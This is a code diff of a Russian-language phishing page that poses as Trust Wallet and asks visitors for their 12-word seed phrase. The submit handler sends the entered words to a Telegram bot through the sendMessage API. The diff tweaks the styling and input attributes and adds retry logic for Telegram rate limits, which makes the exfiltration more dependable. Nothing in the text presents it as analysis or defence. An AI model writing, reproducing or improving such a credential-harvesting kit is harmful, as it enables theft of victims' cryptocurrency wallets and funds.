@@ -12,8 +12,8 @@
             margin: 0;
             padding: 0;
             display: flex;
-            flex-direction: column;
-            justify-content: space-between;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
         }
         .container {
@@ -23,14 +23,13 @@
             border-radius: 16px;
             padding: 20px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            margin: auto;
             text-align: center;
         }
         .logo {
             margin-bottom: 16px;
         }
         .logo img {
-            width: 100px;
+            width: 80px;
             height: auto;
         }
         h1 {
@@ -90,7 +89,7 @@
             transition: background-color 0.3s;
         }
         button:hover {
-            background-color: #0f25c9;
+            background-color: #0f26c5;
         }
         .warning {
             margin-top: 10px;
@@ -99,11 +98,10 @@
             text-align: center;
         }
         footer {
-            background-color: #0B0E11;
-            color: #A0A0A0;
             text-align: center;
-            padding: 10px 0;
-            font-size: 14px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #A0A0A0;
         }
     </style>
 </head>
@@ -118,51 +116,51 @@
             <div class="seed-input">
                 <div class="seed-item">
                     <label for="word1">1.</label>
-                    <input type="text" id="word1" name="word1" placeholder="Введите слово" required>
+                    <input type="text" id="word1" name="word1" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word2">2.</label>
-                    <input type="text" id="word2" name="word2" placeholder="Введите слово" required>
+                    <input type="text" id="word2" name="word2" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word3">3.</label>
-                    <input type="text" id="word3" name="word3" placeholder="Введите слово" required>
+                    <input type="text" id="word3" name="word3" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word4">4.</label>
-                    <input type="text" id="word4" name="word4" placeholder="Введите слово" required>
+                    <input type="text" id="word4" name="word4" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word5">5.</label>
-                    <input type="text" id="word5" name="word5" placeholder="Введите слово" required>
+                    <input type="text" id="word5" name="word5" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word6">6.</label>
-                    <input type="text" id="word6" name="word6" placeholder="Введите слово" required>
+                    <input type="text" id="word6" name="word6" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word7">7.</label>
-                    <input type="text" id="word7" name="word7" placeholder="Введите слово" required>
+                    <input type="text" id="word7" name="word7" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word8">8.</label>
-                    <input type="text" id="word8" name="word8" placeholder="Введите слово" required>
+                    <input type="text" id="word8" name="word8" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word9">9.</label>
-                    <input type="text" id="word9" name="word9" placeholder="Введите слово" required>
+                    <input type="text" id="word9" name="word9" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word10">10.</label>
-                    <input type="text" id="word10" name="word10" placeholder="Введите слово" required>
+                    <input type="text" id="word10" name="word10" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word11">11.</label>
-                    <input type="text" id="word11" name="word11" placeholder="Введите слово" required>
+                    <input type="text" id="word11" name="word11" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word12">12.</label>
-                    <input type="text" id="word12" name="word12" placeholder="Введите слово" required>
+                    <input type="text" id="word12" name="word12" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
             </div>
             <button type="submit">Отправить</button>
@@ -172,6 +170,7 @@
     <footer>
         © 2025 Trust Wallet. Все права защищены.
     </footer>
+
     <script>
         document.getElementById('seedForm').addEventListener('submit', function (e) {
             e.preventDefault();
@@ -181,6 +180,7 @@
             const inputs = document.querySelectorAll('input');
             const seedWords = Array.from(inputs).map(input => input.value.trim());
 
+            // Проверка, что все 12 полей заполнены
             if (seedWords.length !== 12 || seedWords.some(word => word === '')) {
                 alert('Пожалуйста, заполните все 12 полей.');
                 return;
@@ -189,26 +189,34 @@
             // Формируем сообщение с порядковым номером и словами на новой строке
             const message = seedWords.map((word, index) => `Слово ${index + 1}: ${word}`).join('\n');
 
-            // Отправляем сообщение в Telegram
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message }),
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert('Секретная фраза успешно отправлена!');
-                } else {
-                    return response.json().then(data => {
-                        alert('Ошибка отправки: ' + (data.description || 'Неизвестная ошибка'));
-                    });
-                }
-            })
-            .catch(error => {
-                alert('Ошибка: ' + error.message);
-            });
+            // Функция для отправки сообщения в Telegram с обработкой ошибок
+            function sendMessage() {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('Секретная фраза успешно отправлена!');
+                    } else {
+                        if (data.error_code === 429) { // Код ошибки для "Too Many Requests"
+                            const retryAfter = data.parameters.retry_after || 5; // Получаем время задержки (по умолчанию 5 секунд)
+                            alert(`Слишком много запросов. Попробуйте снова через ${retryAfter} секунд.`);
+                            setTimeout(sendMessage, retryAfter * 1000); // Повторить попытку через заданное время
+                        } else {
+                            alert('Ошибка отправки: ' + (data.description || 'Неизвестная ошибка'));
+                        }
+                    }
+                })
+                .catch(error => {
+                    alert('Ошибка: ' + error.message);
+                });
+            }
 
-            document.getElementById('seedForm').reset();
+            sendMessage(); // Отправить сообщение
+            document.getElementById('seedForm').reset(); // Сбросить форму после отправки
         });
     </script>
 </body>
